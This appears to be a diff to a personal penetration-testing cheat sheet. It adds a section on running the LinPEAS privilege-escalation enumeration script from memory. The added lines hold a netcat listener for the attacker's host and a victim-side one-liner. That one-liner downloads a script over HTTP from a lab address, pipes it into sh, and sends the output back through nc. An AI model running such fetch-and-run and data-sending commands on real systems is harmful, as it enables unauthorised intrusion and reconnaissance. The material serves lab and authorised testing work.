@@ -17,6 +17,18 @@ stty raw -echo; fg; export TERM=xterm
 /usr/share/peass/linpeas/linpeas.sh
 ```
 
+## LinPEAS from memory (Kali Host)
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS#quick-start
+```
+nc -lvnp 9002 | tee linpeas.out
+```
+
+## LinPEAS from memory (victim)
+```
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
+```
+
+
 ## LinEnum (Source)
 ```bash
 https://github.com/rebootuser/LinEnum
